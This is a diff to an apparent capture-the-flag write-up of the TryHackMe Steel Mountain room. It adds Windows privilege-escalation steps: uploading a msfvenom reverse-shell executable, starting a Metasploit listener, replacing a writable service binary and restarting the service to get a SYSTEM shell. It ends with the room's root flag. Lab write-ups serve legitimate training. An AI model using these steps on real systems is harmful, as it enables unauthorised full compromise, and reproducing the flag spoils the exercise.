@@ -195,6 +195,17 @@ Q2. Take close attention to the CanRestart option that is set to true. What is t
 
 Q3. The CanRestart option being true, allows us to restart a service on the system, the directory to the application is also write-able. This means we can replace the legitimate application with our malicious one, restart the service, which will run our infected program!
 
+At this point we need to do the following steps:
+1. Generate a payload to to establish a reverse shell  
+2. Upload it  
+3. replace the legitimate one  
+4. Setting up a listener on target machine  
+5. Restart the service  
+6. Check the listener to connection from target.  
+7. Confirm priviledge escalation by whoami command  
+8. Get the root flag
+
+
 Use msfvenom to generate a reverse shell as an Windows executable.
 
 ```bash
@@ -208,8 +219,89 @@ Note: The service showed up as being unquoted (and could be exploited using this
 
 > "No answer needed"
 
+```bash
+meterpreter > upload Advanced.exe
+[*] Uploading  : /home/ppmatrix/Desktop/thm/rooms/Steel Mountain/Advanced.exe -> Advanced.exe
+[*] Uploaded 15.50 KiB of 15.50 KiB (100.0%): /home/ppmatrix/Desktop/thm/rooms/Steel Mountain/Advanced.exe -> Advanced.exe
+[*] Completed  : /home/ppmatrix/Desktop/thm/rooms/Steel Mountain/Advanced.exe -> Advanced.exe
+```
+{: .nolineno }
+
+Now lets set the listener, at another terminal:
+
+```bash
+└─$ msfconsole -q
+msf6 > use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) > set LPORT 4443
+LPORT => 4443
+msf6 exploit(multi/handler) > set LHOST tun0
+LHOST => 10.8.242.20
+msf6 exploit(multi/handler) > run
+
+[*] Started reverse TCP handler on 10.8.242.20:4443 
+```
+{: .nolineno }
+
+Now lets replace the service binary om previous terminal:
+
+```bash
+meterpreter > load powershell
+meterpreter > powershell_shell
+PS > stop-service AdvancedSystemCareService9
+PS > copy Advanced.exe "C:/Program Files (x86)/IObit/Advanced SystemCare/ASCService.exe"
+PS > start-service AdvancedSystemCareService9
+ERROR: start-service : Failed to start service 'Advanced SystemCare Service 9 (AdvancedSystemCareService9)'.
+ERROR: At line:1 char:1
+ERROR: + start-service AdvancedSystemCareService9
+ERROR: + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ERROR:     + CategoryInfo          : OpenError: (System.ServiceProcess.ServiceController:ServiceController) [Start-Service],
+ERROR:    ServiceCommandException
+ERROR:     + FullyQualifiedErrorId : StartServiceFailed,Microsoft.PowerShell.Commands.StartServiceCommand
+ERROR:
+```
+{: .nolineno }
+
+Now checking the Listener...
+
+```bash
+[*] Command shell session 1 opened (10.8.242.20:4443 -> 10.10.148.106:49219) at 2024-01-25 13:44:49 -0500
+
+Shell Banner:
+Microsoft Windows [Version 6.3.9600]
+-----
+          
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+
+C:\Windows\system32>cd\
+cd\
+C:\>cd users\administrator\desktop\
+C:\Users\Administrator\Desktop>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 2E4A-906A
+
+ Directory of C:\Users\Administrator\Desktop
+
+10/12/2020  11:05 AM    <DIR>          .
+10/12/2020  11:05 AM    <DIR>          ..
+10/12/2020  11:05 AM             1,528 activation.ps1
+09/27/2019  04:41 AM                32 root.txt
+               2 File(s)          1,560 bytes
+               2 Dir(s)  44,169,891,840 bytes free
+
+C:\Users\Administrator\Desktop>type root.txt
+type root.txt
+9af5f314f57607c00fd09803a587db80
+
+```
+{: .nolineno }
+
+Q2 done
+
+
 Q4. What is the root flag?
 
-> ""
-
-"https://apjone.uk/tryhackme-rooms-steel-mountain/"
+> "9af5f314f57607c00fd09803a587db80"
